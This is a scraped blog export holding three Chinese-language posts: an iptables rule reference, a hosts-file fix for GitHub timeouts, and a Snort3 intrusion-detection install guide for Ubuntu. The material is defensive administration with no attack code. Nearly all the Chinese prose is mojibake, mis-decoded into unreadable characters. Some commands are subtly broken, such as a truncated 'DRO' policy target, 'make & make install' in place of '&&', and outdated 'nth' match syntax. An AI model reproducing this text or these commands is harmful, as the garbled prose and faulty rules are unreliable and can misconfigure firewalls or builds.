iptablesé˜²ç«å¢™çš„åº”ç”¨å’ŒSNAT&#x2F;DNATç­–ç•¥","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"},{"name":"DNAT","slug":"DNAT","permalink":"https://gryffinbit.top/tags/DNAT/"}],"author":"Gryffinbit"},{"title":"iptablesç®¡ç†å’Œè§„åˆ™","slug":"iptablesç®¡ç†å’Œè§„åˆ™","date":"2022-07-18T16:16:52.000Z","updated":"2024-11-12T06:59:37.000Z","comments":true,"path":"2022/07/19/iptablesç®¡ç†å’Œè§„åˆ™/","permalink":"https://gryffinbit.top/2022/07/19/iptables%E7%AE%A1%E7%90%86%E5%92%8C%E8%A7%84%E5%88%99/","excerpt":"","text":"å‰è¨€iptablesè¯¦è§£è·³è½¬blogï¼šiptablesä»‹ç» iptablesç­–ç•¥è·³è½¬blogï¼šiptablesç­–ç•¥ iptablesæ–‡æ¡£ï¼šiptables(8) - Linux man page iptablesæŒ‡å—ï¼šiptables-tutorial å‘½ä»¤å›¾æ–‡è¡¨ç¤º1iptables [-t è¡¨å] å‘½ä»¤é€‰é¡¹ ï¼»é“¾åï¼½ ï¼»æ¡ä»¶åŒ¹é…ï¼½ ï¼»-j ç›®æ ‡åŠ¨ä½œæˆ–è·³è½¬ï¼½ Table æŒ‡å®šè¡¨åï¼Œå¯ä»¥ä¸ç”¨ç‰¹æ„æŒ‡å®šè¡¨ï¼Œé»˜è®¤ä½¿ç”¨filterè¡¨æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ filterï¼ˆåŒ…è¿‡æ»¤ï¼‰ã€natï¼ˆç½‘è·¯åœ°å€è½¬æ¢ï¼‰ã€mangleï¼ˆåŒ…é‡æ„ã€ä¿®æ”¹ï¼‰ã€rawï¼ˆæ•°æ®è·Ÿè¸ªå¤„ç†ï¼‰ command å‘Šè¯‰ç¨‹åºåšä»€ä¹ˆï¼Œæ¯”å¦‚æ’å…¥è§„åˆ™ï¼Œåˆ é™¤è§„åˆ™ 123456789101112131415161718192021222324252627282930-A åœ¨æŒ‡å®šé“¾çš„æœ«å°¾æ·»åŠ ï¼ˆappendï¼‰ä¸€æ¡æ–°çš„è§„åˆ™-D åˆ é™¤ï¼ˆdeleteï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼Œå¯ä»¥æŒ‰è§„åˆ™åºå·å’Œå†…å®¹åˆ é™¤-I åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ï¼ˆinsertï¼‰ä¸€æ¡æ–°çš„è§„åˆ™ï¼Œé»˜è®¤åœ¨ç¬¬ä¸€è¡Œæ·»åŠ -R ä¿®æ”¹ã€æ›¿æ¢ï¼ˆreplaceï¼‰æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼Œå¯ä»¥æŒ‰è§„åˆ™åºå·å’Œå†…å®¹æ›¿æ¢-L åˆ—å‡ºï¼ˆlistï¼‰æŒ‡å®šé“¾ä¸­æ‰€æœ‰çš„è§„åˆ™è¿›è¡ŒæŸ¥çœ‹-E é‡å‘½åç”¨æˆ·å®šä¹‰çš„é“¾ï¼Œä¸æ”¹å˜é“¾æœ¬èº«-F æ¸…ç©ºï¼ˆflushï¼‰-N æ–°å»ºï¼ˆnew-chainï¼‰ä¸€æ¡ç”¨æˆ·è‡ªå·±å®šä¹‰çš„è§„åˆ™é“¾-X åˆ é™¤æŒ‡å®šè¡¨ä¸­ç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™é“¾ï¼ˆdelete-chainï¼‰-P è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥ï¼ˆpolicyï¼‰-Z å°†æ‰€æœ‰è¡¨çš„æ‰€æœ‰é“¾çš„å­—èŠ‚å’Œæ•°æ®åŒ…è®¡æ•°å™¨æ¸…é›¶-n ä½¿ç”¨æ•°å­—å½¢å¼ï¼ˆnumericï¼‰æ˜¾ç¤ºè¾“å‡ºç»“æœ-v æŸ¥çœ‹è§„åˆ™è¡¨è¯¦ç»†ä¿¡æ¯ï¼ˆverboseï¼‰çš„ä¿¡æ¯-V æŸ¥çœ‹ç‰ˆæœ¬(version)-h è·å–å¸®åŠ©ï¼ˆhelpï¼‰ é€‰æ‹©è§„åˆ™é“¾ é€‰æ‹©å‚æ•° 1234567-p åŒ¹é…åè®®ï¼Œå¦‚TCPã€UDPã€ICMP-s åŒ¹é…æ¥æºåœ°å€ IP/MASKï¼ŒåŠ ï¼è¡¨ç¤ºé™¤å»è¿™ä¸ªip-d åŒ¹é…ç›®æ ‡åœ°å€-i ç½‘å¡åç§° åŒ¹é…ä»è¿™å—ç½‘å¡æµå…¥çš„æ•°æ® -o ç½‘å¡åç§° åŒ¹é…ä»è¿™å—ç½‘å¡æµå‡ºçš„æ•°æ®-dport num åŒ¹é…ç›®æ ‡ç«¯å£å·-sport num åŒ¹é…æ¥æºç«¯å£å· targetç›®æ ‡åŠ¨ä½œï¼Œé€‰æ‹©å¤„ç†æ•°æ®åŒ…çš„æ–¹å¼ã€‚ï¼ˆtargetå¿…é¡»åœ¨æœ€åï¼‰ è§„åˆ™é“¾ï¼š INPUTâ€”â€”è¿›æ¥çš„æ•°æ®åŒ…åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ OUTPUTâ€”â€”å¤–å‡ºçš„æ•°æ®åŒ…åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ FORWARDâ€”â€”è½¬å‘æ•°æ®åŒ…æ—¶åº”ç”¨æ­¤è§„åˆ™é“¾ä¸­çš„ç­–ç•¥ PREROUTINGâ€”â€”å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©å‰åº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™ ï¼ˆæ‰€æœ‰çš„æ•°æ®åŒ…è¿›æ¥çš„æ—¶ä¾¯éƒ½å…ˆç”±è¿™ä¸ªé“¾å¤„ç†ï¼‰ POSTROUTINGâ€”â€”å¯¹æ•°æ®åŒ…ä½œè·¯ç”±é€‰æ‹©ååº”ç”¨æ­¤é“¾ä¸­çš„è§„åˆ™ ï¼ˆæ‰€æœ‰çš„æ•°æ®åŒ…å‡ºæ¥çš„æ—¶ä¾¯éƒ½å…ˆç”±è¿™ä¸ªé“¾å¤„ç†ï¼‰ é˜²ç«å¢™å¤„ç†æ•°æ®åŒ…çš„æ–¹å¼ ACCEPT : å…è®¸æ•°æ®åŒ…é€šè¿‡ DROP : ç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯ REJECT : æ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ã€‚ LOG : åœ¨/var/log/messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ è§„åˆ™ä¿å­˜ä¸æ¢å¤1iptables-save &gt; /etc/sysconfig/iptables 12service iptables save# å°†è§„åˆ™ä¿å­˜åœ¨/etc/sysconfig/iptables åˆ é™¤è§„åˆ™ä¸¾ä¾‹ 12# åˆ é™¤inputé“¾çš„ç¬¬ä¸€æ¡è§„åˆ™iptables -D INPUT 1 å¸¸ç”¨çš„Linux iptablesè§„åˆ™ ä»¥ä¸‹è§„åˆ™çœ‹ä¸€ä¸‹ç†Ÿæ‚‰å°±å¥½äº†ï¼Œå¿˜è®°äº†ç›´æ¥ç”¨iptables --helpæŸ¥çœ‹ åˆ é™¤æ‰€æœ‰ç°æœ‰è§„åˆ™ 1iptables -F è®¾ç½®é»˜è®¤çš„ chain ç­–ç•¥ 1iptables -P INPUT DROP 1iptables -P FORWARD DRO 1iptables -P OUTPUT DROP é˜»æ­¢æŸä¸ªç‰¹å®šçš„ IP åœ°å€ 1BLOCK_THIS_IP=&quot;x.x.x.x&quot; 1iptables -A INPUT -s &quot;$BLOCK_THIS_IP&quot; -j DROP å…è®¸å…¨éƒ¨è¿›æ¥çš„ï¼ˆincomingï¼‰SSH 1iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT åªå…è®¸æŸä¸ªç‰¹å®šç½‘ç»œè¿›æ¥çš„ SSH 1iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT å…è®¸è¿›æ¥çš„ï¼ˆincomingï¼‰HTTP 1iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT å¤šç«¯å£ï¼ˆå…è®¸è¿›æ¥çš„ SSHã€HTTP å’Œ HTTPSï¼‰ 1iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT å…è®¸å‡ºå»çš„ï¼ˆoutgoingï¼‰SSH 1iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT å…è®¸å¤–å‡ºçš„ï¼ˆoutgoingï¼‰SSHï¼Œä½†ä»…è®¿é—®æŸä¸ªç‰¹å®šçš„ç½‘ç»œ 1iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT å…è®¸å¤–å‡ºçš„ï¼ˆoutgoingï¼‰ HTTPS 1iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT å¯¹è¿›æ¥çš„ HTTPS æµé‡åšè´Ÿè½½å‡è¡¡ 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443 ä»å†…éƒ¨å‘å¤–éƒ¨ Ping 1iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT 1iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT ä»å¤–éƒ¨å‘å†…éƒ¨ Ping 1iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT 1iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT å…è®¸ç¯å›ï¼ˆloopbackï¼‰è®¿é—® 1iptables -A INPUT -i lo -j ACCEPT 1iptables -A OUTPUT -o lo -j ACCEPT å…è®¸ packets ä»å†…ç½‘è®¿é—®å¤–ç½‘ 1if eth1 is connected to external network (internet) 1if eth0 is connected to internal network (192.168.1.x) 1iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT å…è®¸å¤–å‡ºçš„ DNS 1iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT 1iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT å…è®¸ NIS è¿æ¥ 12345678910111213rpcinfo -p | grep ypbind ; This port is 853 and 850iptables -A INPUT -p tcp --dport 111 -j ACCEPTiptables -A INPUT -p udp --dport 111 -j ACCEPTiptables -A INPUT -p tcp --dport 853 -j ACCEPTiptables -A INPUT -p udp --dport 853 -j ACCEPTiptables -A INPUT -p tcp --dport 850 -j ACCEPTiptables -A INPUT -p udp --dport 850 -j ACCEPT å…è®¸æŸä¸ªç‰¹å®šç½‘ç»œ rsync è¿›å…¥æœ¬æœº 1iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT ä»…å…è®¸æ¥è‡ªæŸä¸ªç‰¹å®šç½‘ç»œçš„ MySQL çš„é“¾æ¥ 1iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT å…è®¸ Sendmail æˆ– Postfix 1iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT å…è®¸ IMAP å’Œ IMAPS 1234567iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPTiptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT å…è®¸ POP3 å’Œ POP3S 1234567iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPTiptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT é˜²æ­¢ DoS æ”»å‡» 1iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT è®¾ç½® 422 ç«¯å£è½¬å‘åˆ° 22 ç«¯å£ 1iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22 1iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT ä¸ºä¸¢å¼ƒçš„åŒ…åšæ—¥å¿—ï¼ˆLogï¼‰ 1234567iptables -N LOGGINGiptables -A INPUT -j LOGGINGiptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix &quot;IPTables Packet Dropped: &quot; --log-level 7iptables -A LOGGING -j DROP å‚è€ƒé“¾æ¥iptablesè§„åˆ™ iptableså®˜æ–¹æ–‡æ¡£è¯´æ˜ iptables(8) - Linux man page iptables-tutorial","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"ping githubè¶…æ—¶","slug":"githubè¶…æ—¶","date":"2022-07-18T05:02:03.000Z","updated":"2024-11-12T06:59:43.000Z","comments":true,"path":"2022/07/18/githubè¶…æ—¶/","permalink":"https://gryffinbit.top/2022/07/18/github%E8%B6%85%E6%97%B6/","excerpt":"","text":"ä»Šå¤©è¿æ¥åˆ°å…¬å¸çš„ç½‘ä¹‹åï¼Œä¸Šä¼ blogï¼Œå‘ç°ä¸€ç›´ä¼ ä¸ä¸Šå»ã€‚å¼€å§‹ä»¥ä¸ºæ˜¯ç½‘ç»œç¯å¢ƒä¸å¥½ï¼Œå‡ æ¬¡ä¹‹åè¿˜æ˜¯ä¸å¥½ï¼Œäºæ˜¯æ€€ç–‘æ˜¯GitHubå‡ºé—®é¢˜ã€‚ ping GitHub.com æŠ¥é”™è¿æ¥è¶…æ—¶ã€‚äºæ˜¯æ€€ç–‘æ˜¯ï¼šæœ¬åœ°DNSæ— æ³•è§£æå¯¼è‡´çš„ã€‚ 1sudo vim /etc/hosts åœ¨æœ€åä¸€è¡Œæ·»åŠ  12192.30.255.112 github.com git 185.31.16.184 github.global.ssl.fastly.net æœ€åå¯ä»¥æˆåŠŸè®¿é—®githubï¼Œä¸Šä¼ blogã€‚ 1ping github.com","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://gryffinbit.top/tags/GitHub/"}],"author":"Gryffinbit"},{"title":"ubuntuã€x86æ¶æ„ã€‘ä¸‹æ­å»ºsnort3ã€äº‘æœåŠ¡å™¨ç‰ˆã€‘","slug":"ubuntuä¸‹æ­å»ºsnortã€äº‘æœåŠ¡å™¨ç‰ˆã€‘","date":"2022-07-17T15:48:56.000Z","updated":"2024-11-12T06:59:08.000Z","comments":true,"path":"2022/07/17/ubuntuä¸‹æ­å»ºsnortã€äº‘æœåŠ¡å™¨ç‰ˆã€‘/","permalink":"https://gryffinbit.top/2022/07/17/ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BAsnort%E3%80%90%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E3%80%91/","excerpt":"","text":"Tipsubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® ç¯å¢ƒé…ç½®ubuntu ï¼šUbuntu Server 20.04 LTS 64bit x86æ¶æ„ ç‰©ç†æœºï¼šmacOS Monterey. M1,2020 snortç‰ˆæœ¬ï¼šsnort3-3.1.31.0 æ›´æ–°ç³»ç»Ÿè½¯ä»¶æº 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y æ›´æ­£æ—¶é—´ 1sudo dpkg-reconfigure tzdata å®‰è£…ä¾èµ–åŒ… 12sudo apt-get install -y build-essential autotools-dev libdumbnet-dev libluajit-5.1-dev libpcap-dev zlib1g-dev pkg-config libhwloc-dev cmake liblzma-dev openssl libssl-dev cpputest libsqlite3-dev libtool uuid-dev git autoconf bison flex libcmocka-dev libnetfilter-queue-dev libunwind-dev libmnl-dev ethtool å®‰è£…snort DAQåœ¨å®˜ç½‘ä¸‹è½½èµ„æºåŒ… ä¸‹è½½å¹¶å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Snort DAQï¼ˆæ•°æ®é‡‡é›†åº“ï¼‰ snort 3.0 libdaq-v3.0.8.tar.gz ä¸Šä¼ æ–‡ä»¶åˆ°ubuntuæœåŠ¡å™¨ 1scp /path/local_filename username@servername:/path å®‰è£…æ–‡ä»¶ä¸Šä¼ ï¼Œä¸‹è½½ï¼ˆWindowsï¼‰ 1apt-get install lrzsz sshè¿œç¨‹æ—¶ï¼Œä¸Šä¼ ç”¨rzå‘½ä»¤ï¼Œæ•²rzå›è½¦é€‰ä½ è¦ä¸Šä¼ çš„æ–‡ä»¶ ä¸‹è½½ç”¨â€œsz æ–‡ä»¶è·¯å¾„â€å›è½¦ï¼Œé€‰ä¿å­˜çš„ä½ç½® æ–°å»ºä¸€ä¸ªsnortä¸“ç”¨æ–‡ä»¶å¤¹ï¼Œå°†ä»¥åsnortçš„å†…å®¹éƒ½æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ 12mkdir snortSourceFilemv libdaq-3.0.8 snortSourceFile ç¼–è¯‘å®‰è£… 12cd libdaq-3.0.8./configure æŠ¥é”™ï¼šerror: cannot find input file: &#96;api&#x2F;Makefile.inâ€™ 12aclocalautomake --add-missing 12./bootstrap ./configure ç¼–è¯‘æˆåŠŸ 1sudo make &amp; make install å®‰è£…snort 3.0snort3-3.1.31.0.tar.gz æœ¬æœºä¸‹è½½snortåï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ 1scp /path/local_filename username@servername:/path å°†ä¸Šä¼ çš„æ–‡ä»¶è§£å‹ï¼Œå¹¶ç§»è‡³snortæ–‡ä»¶å¤¹ 123tar -zxvf snort3-3.1.31.0.tar.gzrm -rf snort3-3.1.31.0.tar.gzmv snort3-3.1.31.0 snortSourceFile ä¾èµ–åº“å®‰è£… 1234sudo apt-get install libpcre3-devsudo apt-get install libdumbnet-devsudo apt-get install liblua5.2-devsudo apt-get install libnghttp2-dev è®¾ç½®è·¯å¾„ 1vim ~/.bashrc å†™å…¥ 1export my_path=/usr/local è®¾ç½®å®‰è£…è·¯å¾„ 1source ~/.bashrc ç¼–è¯‘ 123456cd snortSourceFilecd snort3-3.1.31.0/./configure_cmake.sh --prefix=$my_pathcd buildmakesudo make install ä¿®å¤é“¾æ¥ 1sudo ldconfig æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ 1snort -V ç”¨é»˜è®¤é…ç½®æ–‡ä»¶æµ‹è¯•snort 1snort -c /usr/local/etc/snort/snort.lua èƒ½å¤ŸæˆåŠŸè¿è¡Œ åˆ›å»ºç”¨æˆ·ç¯å¢ƒ12sudo groupadd snortsudo useradd snort -r -s /usr/sbin/nologin -c SNORT_IDS -g snort å‚æ•°è¯´æ˜ï¼š -rï¼šåˆ›å»ºä¸€ä¸ªç³»ç»Ÿè´¦æˆ· -sï¼šç”¨æˆ·ç™»å½•åä½¿ç”¨çš„shellåç§°ï¼ˆé»˜è®¤å€¼ä¸å¡«å†™ï¼Œè¿™æ ·ç³»ç»Ÿä¼šæŒ‡å®šé¢„è®¾çš„ç™»å…¥shellï¼Œæ ¹æ®&#x2F;etc&#x2F;default&#x2F;useraddé¢„è®¾å€¼ï¼‰ã€sbin&#x2F;nologin ä»£è¡¨è¿™ä¸ªç”¨æˆ·æ— æ³•ä½¿ç”¨bashæˆ–å…¶ä»–shellæ¥ç™»é™†ç³»ç»Ÿï¼Œå³ä½¿ç»™äº†å¯†ç ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç³»ç»Ÿèµ„æºã€‚åªæ˜¯ä¸èƒ½ç™»é™†ä¸»æœºè€Œå·²ã€‚ã€‘ -gï¼šgroupåç§°ã€æ·»åŠ åˆ°snortç»„ä¸‹ã€‘ -cï¼šcommentï¼Œæ³¨é‡Šè¯´æ˜æ  æ£€æŸ¥æ˜¯å¦æ·»åŠ æˆåŠŸ æ£€æŸ¥æ˜¯å¦æ·»åŠ ç»„æˆåŠŸ 1cat /etc/group æ£€æŸ¥snortç»„ä¸‹é¢ç”¨æˆ·æ˜¯å¦æ·»åŠ æˆåŠŸ 1id snort åˆ›å»ºsnortç›®å½•123456sudo mkdir /etc/snortsudo mkdir /etc/snort/rulessudo mkdir /etc/snort/rules/iplistssudo mkdir /etc/snort/preproc_rulessudo mkdir /usr/local/lib/snort_dynamicrulessudo mkdir /etc/snort/so_rules åˆ›å»ºè§„åˆ™æ–‡ä»¶1234567sudo touch /etc/snort/rules/iplists/black_list.rulessudo touch /etc/snort/rules/iplists/white_list.rulessudo touch /etc/snort/rules/local.rulessudo touch /etc/snort/sid-msg.map åˆ›å»ºæ—¥å¿—ç›®å½•123sudo mkdir /var/log/snortsudo mkdir /var/log/snort/archived_logs åŠ æƒé™123456789sudo chmod -R 775 /etc/snortsudo chmod -R 775 /var/log/snortsudo chmod -R 775 /var/log/snort/archived_logssudo chmod -R 775 /etc/snort/so_rulessudo chmod -R 775 /usr/local/lib/snort_dynamicrules 775æƒé™ï¼š rootæœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ ç»„ç”¨æˆ·æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ å…¶ä»–ç”¨æˆ·æœ‰è¯»ã€æ‰§è¡Œæƒé™ è¯»å–æƒé™ r&#x3D;4ã€‚å†™å…¥æƒé™ w&#x3D;2ã€‚æ‰§è¡Œæƒé™ x&#x3D;1 ç¬¬ä¸€ä¸ªæ•°å­— ï¼šæ‹¥æœ‰è€…æƒé™ï¼ˆrootï¼Œæ–‡ä»¶æ‰€æœ‰è€…ï¼‰ ç¬¬äºŒä¸ªæ•°å­— ï¼šç»„ç”¨æˆ·æƒé™ï¼ˆä¸æ–‡ä»¶æ‰€æœ‰è€…å±äºåŒä¸€ä¸ªç”¨æˆ·ç»„ï¼‰ ç¬¬ä¸‰ä¸ªæ•°å­— ï¼šå…¶ä»–ç”¨æˆ·æƒé™ ä¿®æ”¹æ–‡ä»¶æ‰€å±ç”¨æˆ·åŠç”¨æˆ·ç»„12345sudo chown -R snort:snort /etc/snortsudo chown -R snort:snort /var/log/snortsudo chown -R snort:snort /usr/local/lib/snort_dynamicrules å°†è¿™äº›æ–‡ä»¶çš„æ‰€å±ä¿®æ”¹ä¸ºä¹‹å‰åˆ›å»ºçš„snortç»„é‡Œé¢çš„snortç”¨æˆ· æŸ¥çœ‹æ–‡ä»¶æ‰€å± ls -l &lt;file&gt; ç¬¬ä¸€åˆ—å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯dï¼šæ„å‘³ç€å†…å®¹æ˜¯ç›®å½•æˆ–æ–‡ä»¶ â€‹ å¦‚æœç¬¬ä¸€ä¸ªæ˜¯-ï¼šæ„å‘³ç€å®ƒçš„å†…å®¹æ˜¯æ–‡ä»¶ â€‹ ç¬¬ä¸€ä¸ªæ˜¯lï¼šæ„å‘³ç€å†…å®¹æ˜¯é“¾æ¥æ–‡ä»¶ â€‹ åé¢çš„å†…å®¹æ˜¯æ–‡ä»¶æ‰€å± â€‹ ï¼ˆå¯¹åº”ç€ä¸‰ä¸ªæ•°å­—æƒé™775ï¼‰ â€‹ å‰ä¸‰ä¸ªå­—æ¯æ˜¯æ–‡ä»¶æ‹¥æœ‰è€…æƒé™ â€‹ ä¸­é—´ä¸‰ä¸ªæ˜¯æ–‡ä»¶æ‰€æœ‰ç»„æƒé™ â€‹ åä¸‰ä¸ªæ˜¯å…¶ä»–äººè®¿é—®æ–‡ä»¶çš„æƒé™ ç¬¬äºŒåˆ—å«ä¹‰ï¼šå¤šå°‘é“¾æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ ç¬¬ä¸‰åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„æ‰€æœ‰è€… ç¬¬å››åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹æ‰€æœ‰ç»„ ç¬¬äº”åˆ—å«ä¹‰ï¼šè¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„ä»¥å­—èŠ‚ä¸ºå•ä½çš„å¤§å°ã€‚ç›®å½•çš„å¤§å°æ€»æ˜¯4096å­—èŠ‚ ç¬¬å…­åˆ—å«ä¹‰ï¼šæ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ ç¬¬ä¸ƒåˆ—å«ä¹‰ï¼šæ–‡ä»¶åæˆ–ç›®å½•å é™„å½•ï¼šsnort æ–‡ä»¶éƒ¨ç½² å·²ç»è®¾ç½®çš„å®‰è£…è·¯å¾„ export my_path&#x3D;&#x2F;usr&#x2F;local snortå®‰è£…åŒ…æ‰€åœ¨è·¯å¾„ã€ç›¸å…³æ–‡æ¡£ 1cd /home/ubuntu/snortSourceFile docï¼šsnortçš„ä¸€äº›è¯´æ˜æ–‡æ¡£æ‰€åœ¨æ–‡ä»¶å¤¹ snortè§„åˆ™æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ 1cd /etc/snort snortæ—¥å¿—æ–‡ä»¶ 1cd /var/log/snort snortè¿è¡Œ 1/usr/local/bin/snort /usr/sbin åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ã€å®ˆæŠ¤è¿›ç¨‹æ˜¯åœ¨åå°è¿è¡Œçš„è¿›ç¨‹ï¼Œç”¨äºæ‰§è¡Œç‰¹å®šçš„ç³»ç»Ÿä»»åŠ¡ã€‚å¾ˆå¤šå®ˆæŠ¤è¿›ç¨‹åœ¨ç³»ç»Ÿå¼•å¯¼çš„æ—¶å€™å¯åŠ¨ï¼Œå¹¶ä¸”ä¸€ç›´è¿è¡Œåˆ°ç³»ç»Ÿå…³é—­ã€‚ã€‘ ä¸€ä¸ªå…³äºè·¯å¾„çš„å°tips å®‰è£…è·¯å¾„æ˜¯åœ¨ /usr/local/etc/snort 